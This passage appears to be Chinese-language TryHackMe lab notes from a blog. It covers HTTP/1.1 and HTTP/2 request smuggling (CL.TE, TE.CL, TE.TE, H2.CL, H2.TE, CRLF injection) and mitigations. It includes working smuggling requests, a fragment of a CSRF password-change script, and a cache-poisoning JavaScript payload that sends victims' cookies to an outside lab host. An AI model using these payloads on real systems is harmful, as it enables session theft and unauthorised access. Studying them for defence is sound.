<span class="line"><span style="color: #abb2bf">    } else {</span></span>
<span class="line"><span style="color: #abb2bf">      console.error(&#39;Password change request failed. Status:&#39;, xhr.status, xhr.statusText);</span></span>
<span class="line"><span style="color: #abb2bf">    }</span></span>
<span class="line"><span style="color: #abb2bf">  };</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.onerror = function() {</span></span>
<span class="line"><span style="color: #abb2bf">    console.error(&#39;Network error during password change request.&#39;);</span></span>
<span class="line"><span style="color: #abb2bf">  };</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.send(postBody);</span></span>
<span class="line"><span style="color: #abb2bf">&lt;/script&gt;</span></span></code></pre></div></div></figure>

<p>这一关还挺好玩的，要用到 CSRF，之前有印象但是没做笔记，用的是 XHR 来实现的，然后还对 url 做了 base64，避免 URL 被转成 a 标签。</p>
<h1 id="HTTP-Request-Smuggling"><a href="#HTTP-Request-Smuggling" class="headerlink" title="HTTP Request Smuggling"></a>HTTP Request Smuggling</h1><p>这个房间就是利用前端和后端服务器对一个请求的处理不一致导致的问题，里面主要用到的是一些 HTTP Header 的错配导致的问题，用到的主要有 Content-Length 和 Transfer-Encoding。还有一个就是计算 <code>\r</code> 和 <code>\n</code> 是否统计成字符数的问题。通过后面那个实操我感觉就像缓存投毒，会在一个连接里面复用，然后把其他用户的数据发到了不该发到的地方，这个直接应该是前端 - 后端这个过程中发生的。</p>
<h2 id="现代基架"><a href="#现代基架" class="headerlink" title="现代基架"></a>现代基架</h2><p>文中指出了现在的 Web 应用不是那么的直接了，大多都是由多个部分组成的，一般有以下几个部分：</p>
<ul>
<li>前端服务器</li>
<li>后端服务器</li>
<li>数据库</li>
<li>APIs</li>
<li>微服务：一般用 HTTP&#x2F;REST 或 gPRC</li>
<li>负载均衡</li>
<li>反代</li>
</ul>
<h3 id="缓存机制的职责"><a href="#缓存机制的职责" class="headerlink" title="缓存机制的职责"></a>缓存机制的职责</h3><p>缓存是一种技术，用于存储并重复利用之前获取的数据或计算结果，以加速后续的请求和计算。</p>
<p>在目前 Web 基础架构下，缓存有如下几点：</p>
<ul>
<li>内容缓存：一般缓存的是不会频繁刷新的内容，比如图片，CSS 和 JS。缓存机制能减少 Web 服务器的负载和加速用户的访问</li>
<li>数据库查询缓存：避免重复查</li>
<li>页面缓存：缓存整个网页，我猜这个是在 CDN 场景分发静态界面用到的</li>
<li>边缘缓存&#x2F;CDNs</li>
<li>API 缓存</li>
</ul>
<h2 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h2><p>每个 HTTP 头都有两个主要部分：header 和 body</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting%5C802fad8f6515cfe16750e11e4b89957a.png" alt="HTTP Structure" data-caption="HTTP Structure" loading="lazy"></p>
<ol>
<li>Request Line：<strong>请求行</strong>是 HTTP 请求的第一行。它至少包含三个部分：<ol>
<li><strong>方法（Method）</strong>：一个单词的命令，告诉服务器如何处理请求的资源。例如，<code>GET</code> 或 <code>POST</code>。</li>
<li><strong>路径（Path）</strong>：URL 的路径部分，用于标识服务器上的具体资源（例如，<code>/admin/login</code>）。</li>
<li><strong>HTTP 版本号（HTTP Version Number）</strong>：表明客户端遵循的 HTTP 规范版本。</li>
<li>值得注意的是，HTTP&#x2F;2 和 HTTP&#x2F;1.1 在结构上有所不同。</li>
</ol>
</li>
<li>Request Header：这部分包含请求的元数据，比如发送内容的类型（<code>Content-Type</code>）、期望的响应格式，以及认证令牌（Authentication Tokens）等。</li>
<li>Message Body：这是请求的实际内容。对于 <code>GET</code> 请求，消息体通常是空的；但对于 <code>POST</code> 请求，它可能包含表单数据、JSON 数据包或上传的文件。</li>
</ol>
<p><strong>Content-Length Header</strong></p>
<p>Content-Length 标头表示请求或响应正文的大小（以字节为单位）。它告知接收服务器需要多少数据，以确保接收到全部内容。</p>
<p><strong>Transfer-Encoding Header</strong></p>
<p>Transfer-Encoding 标头用于指定应用于 HTTP 请求或响应的信息体的编码形式。该标头的常用值是 “chunked（分块）”，表示信息体被分成一系列块，每个块前面都有<strong>十六进制格式的大小</strong>。</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre><code>POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
    
b
q=smuggledData 
0</code></pre></div></div></figure>

<p>这个例子中 <code>q=smuggledData</code> 大小是 11 字节，后面是新的一行。请求以一行 “0 ”结束，表示信息体的结束。每个分块的大小都以十六进制格式给出，分块正文的结束由大小为 0 的分块表示。</p>
<h3 id="HTTP-Request-Smuggling-Origin"><a href="#HTTP-Request-Smuggling-Origin" class="headerlink" title="HTTP Request Smuggling Origin"></a>HTTP Request Smuggling Origin</h3><p>如果 CL 和 TE 一起用的话，这种就容易引起问题，因为一些组件可能优先用 CL，也可能用 TE。这种缺陷就导致了一个组件觉得这个请求结束了，但是另一个组件认为他仍然存在，导致问题出现。</p>
<p>举例说明：假设前端服务器用 CL 来确定一个请求的结束然而后端服务器用的 TE。攻击者可以伪造一个请求，在前端服务器看来是一个边界，而在后端服务器看来是另一个边界。这可能导致一个请求被<strong>偷渡</strong>到另一个请求中，造成意想不到的行为和潜在漏洞。</p>
<h2 id="不同类型的偷渡"><a href="#不同类型的偷渡" class="headerlink" title="不同类型的偷渡"></a>不同类型的偷渡</h2><p>注意：这里指的前端服务器不单单指的是通俗意义上的<strong>网页前端</strong>服务器，而是广泛意义上的前端，比如说反代入口，负载均衡入口等等。</p>
<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>这种类型就是前端服务器用 CL 头，后端服务器用 TE。</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true</code></pre></div></div></figure>

<p>这个例子就是 CL 为 130 字节，前端服务器认为这个请求在 <code>isadmin=true</code> 后面结束，但是后端服务器看到了 TE 是 chunk，所以认为 0 是这个块的结尾，后面的是一个新的请求。可能会导致未授权访问的发生。</p>
<h3 id="不正确的-CL"><a href="#不正确的-CL" class="headerlink" title="不正确的 CL"></a>不正确的 CL</h3><p>如果 CL 少于实际的数据大小，他会按 CL 的数据来读取，这就会导致数据被截断了（也要看具体的应用服务器）。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>和 CL.TE 不同，这种就完全反过来了，前端用的 TE，后端用的 CL。</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0</code></pre></div></div></figure>

<p>在上面的示例中，前端服务器看到了 <code>Transfer-Encoding: chunked</code> ，把这个请求当成块处理， <code>78</code> 标识接下来的 120 个字节是当前请求体的一部分，前端服务器会认为最后一个 <code>0</code> 之前的所有数据都是这个请求的一部分。</p>
<p>然而，后端服务器会使用 <code>Content-Length</code> 头，该头被设置为 <code>4</code>。它只会处理请求的前 4 个字节（78 \r \n）。请求的剩余部分（从 <code>POST /update</code> 开始）随后会被后端服务器解释为一个独立的新请求。</p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE 漏洞不总是需要多个 <code>Transfer-Encoding</code> 头。相反，它通常涉及一个单独的、格式错误的 <code>Transfer-Encoding</code> 头，这个头被前端和后端服务器以不同的方式解释。</p>
<p>攻击者通过包含“chunked”的畸形变体来操纵 <code>Transfer-Encoding</code> 头。这样做是为了利用前端和后端服务器在优先级上如何处理 <code>Transfer-Encoding</code> (TE) 头而不是 <code>Content-Length</code> (CL) 头。通过构造畸形的 <code>Transfer-Encoding</code> 头，攻击者旨在使其中一台服务器忽略 TE 头而转而使用 CL 头，从而导致前端和后端服务器在解释请求边界时出现差异。这种操纵可能导致出现 CL.TE 或 TE.CL 情况，具体取决于哪台服务器退而使用 <code>Content-Length</code>。</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0</code></pre></div></div></figure>

<p>前端服务器会遇到两个 <code>Transfer-Encoding</code> 头。第一个是标准的 <code>chunked</code> 编码，但第二个 <code>chunked1</code> 是非标准的。根据其配置，前端服务器可能会基于第一个 <code>Transfer-Encoding: chunked</code> 头来处理请求，并忽略畸形的 <code>chunked1</code>，从而将直到 <code>0</code>（表示分块消息结束）之前的所有内容都解释为单个分块消息的组成部分。</p>
<p>然而，后端服务器可能会以不同方式处理畸形的 <code>Transfer-Encoding: chunked1</code>。它可能要么拒绝畸形部分并像前端服务器一样处理请求，要么由于存在非标准头而以不同方式解释请求。如果它仅处理 <code>Content-length: 4</code> 所指示的前 4 个字节，那么从 <code>POST /update</code> 开始的请求剩余部分随后将被视为一个独立的、新的请求。</p>
<p>被走私的请求（包含 <code>isadmin=true</code> 参数）将由后端服务器处理，就好像它是一个合法且独立的请求一样。根据服务器功能和 <code>/update</code> 端点的性质，这可能导致未经授权的操作或数据修改。</p>
<hr>
<p>TBH 我不理解🤔为什么会出现未授权访问呢，后端不加鉴权的吗，为什么简单的绕过就能绕过这个鉴权？后面那个实操我倒能理解，他把别人的请求混在一起夹带到另一个会话了，导致我能偷他的数据。</p>
<h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>构造了一个 ATS (Apache Traffic Server) 作为前端代理, Nginx 作为 Web 服务器后端，PHP 处理动态内容。由于 ATS 和 Nginx 优先处理 Content-Length 和 Transfer-Encoding 标头的方式不同，存在 HTTP 请求走私的可能性。</p>
<figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=§</code></pre></div></div></figure>

<p>这个 payload，前端解析了 Content-Length，认为这是一整个请求，把他转发到后端，然而后端服务器优先解析 Transfer-Encoding，把 0 前面的请求截断，然后认为第二部分的 POST 请求是一个全新的请求。</p>
<p>然后疑似这个房间有 bug，过不去，搁置了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HTTP 请求走私由于服务器对请求头的解析不一导致的。</p>
<h3 id="缓解方法"><a href="#缓解方法" class="headerlink" title="缓解方法"></a>缓解方法</h3><ul>
<li><strong>统一的头部处理：</strong> 确保所有服务器以相同的方式处理 HTTP 头部，以防止出现请求走私的机会。</li>
<li><strong>采用 HTTP&#x2F;2：</strong> 转向使用 HTTP&#x2F;2 可以增强对请求边界的管理，从而降低走私的风险。</li>
<li><strong>持续监控和审查：</strong> 密切关注服务器流量中是否存在请求走私的迹象，并定期进行检查以维护安全的服务器配置。</li>
<li><strong>团队意识：</strong> 确保开发和运维团队都了解请求走私的危险以及相应的预防措施。</li>
</ul>
<h1 id="HTTP-2-Request-Smuggling"><a href="#HTTP-2-Request-Smuggling" class="headerlink" title="HTTP&#x2F;2 Request Smuggling"></a>HTTP&#x2F;2 Request Smuggling</h1><h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP&#x2F;2"></a>HTTP&#x2F;2</h2><p>最大的区别是它更改了消息的格式，完全用二进制的格式，而不是 HTTP&#x2F;1.1 那种人类可读的格式。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b62f90be37525447e4a9118b906f1291.svg" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;b62f90be37525447e4a9118b906f1291.svg" data-caption="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;b62f90be37525447e4a9118b906f1291.svg" loading="lazy"></p>
<p>以下是 HTTP&#x2F;2 请求的几个主要组成部分：</p>
<ul>
<li><strong>伪头部（Pseudo-headers）</strong>：HTTP&#x2F;2 定义了一些以冒号 <code>:</code> 开头的特殊头部。这些是构成一个有效 HTTP&#x2F;2 请求的<strong>最小必需字段</strong>。例如，你可以在上图中看到 <code>:method</code>、<code>:path</code>、<code>:scheme</code> 和 <code>:authority</code> 等伪头部。</li>
<li><strong>常规头部（Headers）</strong>：在伪头部之后，是常规的 HTTP 头部，例如 <code>user-agent</code> 和 <code>content-length</code>。请注意，HTTP&#x2F;2 <strong>强制使用小写</strong>来表示这些头部名称。</li>
<li><strong>请求体（Request Body）</strong>：与 HTTP&#x2F;1.1 类似，请求体包含随请求发送的任何额外信息，例如 <code>POST</code> 请求的参数、上传的文件或其他数据。</li>
</ul>
<p>另一个重要的结构性改变，虽然可能不那么明显，但在于 HTTP&#x2F;2 <strong>为请求或响应的每个部分建立了精确的边界</strong>。HTTP&#x2F;2 不再像 HTTP&#x2F;1.1 那样依赖 <code>\r\n</code> 等特定字符来分隔不同的头部，或者依赖冒号 <code>:</code> 来分隔头部名称和值。相反，HTTP&#x2F;2 <strong>引入了明确的字段来跟踪请求（或响应）中每个部分的大小</strong>。</p>
<h3 id="Request-Smuggling-and-HTTP-2"><a href="#Request-Smuggling-and-HTTP-2" class="headerlink" title="Request Smuggling and HTTP&#x2F;2"></a>Request Smuggling and HTTP&#x2F;2</h3><p><strong>HTTP 请求走私之所以在 HTTP&#x2F;1 场景下成为可能，主要原因在于存在多种定义请求体大小的方式。</strong> 协议中的这种<strong>模糊性</strong>导致不同的代理服务器对请求何时结束以及下一个请求何时开始有各自的解释，最终引发了请求走私的情况。</p>
<p>在 HTTP 请求走私的语境下，我们最关注的一点是：HTTP&#x2F;2 <strong>明确定义了请求各部分的大小。</strong> 为了避免 HTTP&#x2F;1 中的这种不确定性，HTTP&#x2F;2 在每个请求组件前添加了一个包含其大小的字段。例如，每个头部都会被前置一个表示其大小的字段，这样解析器就能精确地知道需要读取多少信息。为了更好地理解这一点，我们来看看在 Wireshark 中捕获到的一个请求，特别是请求头部分：</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting%5C25f541a57c89cb198f879c7fefee15ec.png" alt="HTTP 2 Binary Format" data-caption="HTTP 2 Binary Format" loading="lazy"></p>
<p>在图片中，我们看到的是 <code>:method</code> 伪头部。正如我们所观察到的，无论是<strong>头部名称</strong>还是<strong>头部值</strong>都带有各自的长度前缀。头部名称的长度是 7，对应着 <code>:method</code>；而头部值的长度是 3，对应着字符串 <code>GET</code>。</p>
<p>请求体同样包含一个长度指示器，这使得 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code> 等头部在纯粹的 HTTP&#x2F;2 环境中变得毫无意义。</p>
<p><strong>注意：</strong> 尽管 HTTP&#x2F;2 不会直接使用 <code>Content-Length</code> 头部，但现代浏览器在特定情况下（即可能发生 HTTP 降级时）仍会包含这些头部。</p>
<p>有了这样清晰的请求各部分边界，人们可能会认为请求走私是不可能的，在<strong>完全依赖 HTTP&#x2F;2 的实现中</strong>，某种程度上确实如此。然而，与任何新协议版本一样，并非所有设备都能直接升级。这导致了许多负载均衡器或反向代理虽然支持 HTTP&#x2F;2，但却从仍然使用 HTTP&#x2F;1 的服务器集群中提供内容。</p>
<p>我觉得最大的区别就是去掉了 <code>\r\n</code> ，然后加了类似 TLV 这样的格式，还在必须要有的字段加了一个伪头部。</p>
<h2 id="HTTP-2-Desync"><a href="#HTTP-2-Desync" class="headerlink" title="HTTP&#x2F;2 Desync"></a>HTTP&#x2F;2 Desync</h2><h3 id="HTTP-2-Downgrading"><a href="#HTTP-2-Downgrading" class="headerlink" title="HTTP&#x2F;2 Downgrading"></a>HTTP&#x2F;2 Downgrading</h3><p>当<strong>用户（或攻击者）与前端反向代理之间使用 HTTP&#x2F;2</strong>，而<strong>前端代理与后端服务器之间仍使用 HTTP&#x2F;1.1</strong> 时，我们称之为 <strong>HTTP&#x2F;2 降级（downgrading）</strong>。</p>
<p>在这种混合协议环境中，HTTP 请求走私是有可能发生的。攻击者并<strong>不是直接利用 HTTP&#x2F;2 的漏洞</strong>，而是通过精心构造的 HTTP&#x2F;2 请求，来<strong>影响前端代理将其转换为 HTTP&#x2F;1.1 请求的方式</strong>。</p>
<p>理想情况下，前端代理应该能完美地将一个 HTTP&#x2F;2 请求精确转换为一个等效的 HTTP&#x2F;1.1 请求。然而，在实际操作中，<strong>不同的代理实现方式会造成转换上的细微差异</strong>。攻击者正是利用这些差异，诱使代理在后端连接中生成畸形或意料之外的 HTTP&#x2F;1.1 请求，从而导致<strong>HTTP 脱同步（desync）</strong>。</p>
<h3 id="预期行为"><a href="#预期行为" class="headerlink" title="预期行为"></a>预期行为</h3><h4 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h4><p>HTTP&#x2F;2 不需要 <code>content-length</code> ，但是目前的现代浏览器会把他加上去预防 HTTP 降级。</p>
<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f01b7f9b691452f47a11b6363d5711b.svg" style="width:100%" alt="H2.CL Case" data-caption="H2.CL Case" loading="lazy">

<p>如果前端带了一个大小为 0 的 content-length 过去，那么原始 Body 会拼接到新请求的后面。</p>
<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/60cc684893cd19e782fb0178285e93fd.svg" style="width:100%" alt="H2.CL Victim" data-caption="H2.CL Victim" loading="lazy">

<h4 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE"></a>H2.TE</h4><p>我们同样能加 <code>Transfer-Encoding: chunked</code> 头部到前端 HTTP&#x2F;2 请求，代理也可能将其原封不动地传递给后端 HTTP&#x2F;1.1 连接。如果后端服务器优先选择这个头部去定义请求体的大小，我们能再次使这个连接去同步。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/62d1c36e7c84315008fdfb09519c218f.svg" alt="H2.TE Case" data-caption="H2.TE Case" loading="lazy"></p>
<p>可以看到一个请求里面又包含了一个新的请求，后端会解析那个 <code>0</code> ，把后面的一块当成新的请求来处理。</p>
<h4 id="CRLF-injection"><a href="#CRLF-injection" class="headerlink" title="CRLF injection"></a>CRLF injection</h4><p>这个就和 HTTP&#x2F;1.1 有关系了，因为 HTTP&#x2F;1.1 就是用 <code>\r\n</code> 来分隔字段的，一个空行里面插一个 <code>\r\n</code> 然后下一行跟着一个 GET 请求，就是新的一条请求了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有两种利用方式，一种是请求隧道，一种是去同步。</p>
<h3 id="H2-CL-1"><a href="#H2-CL-1" class="headerlink" title="H2.CL"></a>H2.CL</h3><p>通过修改 CL 为 0 ，同时修改 body 为特定字段，导致下一个请求的人的请求被拼接，造成 CSRF。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /post/like/12315198742342 HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">X: f</span></span></code></pre></div></div></figure>

<p>为什么能造成这样，是因为前端代理服务器把这个拆成 2 条请求了，上面这个 payload 会等待受害者的请求，一旦受害者请求，他的请求会被拼接在这后面，变成</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /post/like/xxx HTTP/1.1\r\n</span></span>
<span class="line"><span style="color: #abb2bf">X: fGET / HTTP/1.1\r\n</span></span>
<span class="line"><span style="color: #abb2bf">Host: xxxx\r\n</span></span>
<span class="line"><span style="color: #abb2bf">User-Agent: xxx\r\n</span></span>
<span class="line"><span style="color: #abb2bf">Cookie: COOKIE_STRING\r\n</span></span>
<span class="line"><span style="color: #abb2bf">\r\n</span></span></code></pre></div></div></figure>

<p>这样受害者就会携带他的 Cookie 去访问我们定义好的那个端点。</p>
<p>记得要在 Burp 里面取消<strong>更新 Content-Length</strong>，还有那个 payload 末尾不要有 \r\n，执行一次要等待 30s 去等待受害者去访问页面。</p>
<p>还有这个我实测是需要前一个请求是 POST 请求，如果是 GET 不生效。</p>
<h3 id="Leaking-Internal-Headers"><a href="#Leaking-Internal-Headers" class="headerlink" title="Leaking Internal Headers"></a>Leaking Internal Headers</h3><p>通过构造好的 payload 让别人的请求拼接在你的请求的参数里面，导致回显，这个例子是前端代理的 header 字段，比如这个 header 里面有一些密钥或者鉴权之类的 token，可以通过这种方式偷出来。</p>
<p>这个例子是利用前端的一个搜索参数，填在搜索区域的参数有回显导致的，和反射型 XSS 类似。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">abcd</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">POST /hello HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Content-Length: 300</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span>
<span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">q=</span></span></code></pre></div></div></figure>

<p>这里同样记得把更新 Content-Length 关掉</p>
<h3 id="Bypassing-Frontend-Restrictions"><a href="#Bypassing-Frontend-Restrictions" class="headerlink" title="Bypassing Frontend Restrictions"></a>Bypassing Frontend Restrictions</h3><p>这个其实是一条请求里面混两条请求，用 POST 请求的目的是为了避免缓存</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">abcd</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /admin HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">X-Fake: a</span></span></code></pre></div></div></figure>

<p>这个方法也同样可以去绕 WAF，因为这个请求看起来我们是在访问一个合法的端点</p>
<h3 id="Web-Cache-Poisoning-缓存投毒"><a href="#Web-Cache-Poisoning-缓存投毒" class="headerlink" title="Web Cache Poisoning 缓存投毒"></a>Web Cache Poisoning 缓存投毒</h3><p>这个就不用过多解释了，投毒后 CSRF。</p>
<p><strong>偷 cookie payload</strong></p>
<p>要找一个文件上传点传上去，这里内置好了</p>
<figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">xhttp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">XMLHttpRequest</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">onreadystatechange</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF">() {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">readyState</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">200</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getElementById</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;demo&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">innerHTML</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">responseText</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">};</span></span>
<span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">open</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;GET&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;https://10.11.141.2:8002/?c=&quot;</span><span style="color: #56B6C2">+</span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">cookie</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure>

<p><strong>生成自签证书</strong></p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">openssl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">req</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x509</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-newkey</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rsa:4096</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-keyout</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">key.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-out</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cert.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-sha256</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-days</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3650</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-nodes</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-subj</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot;</span></span></code></pre></div></div></figure>

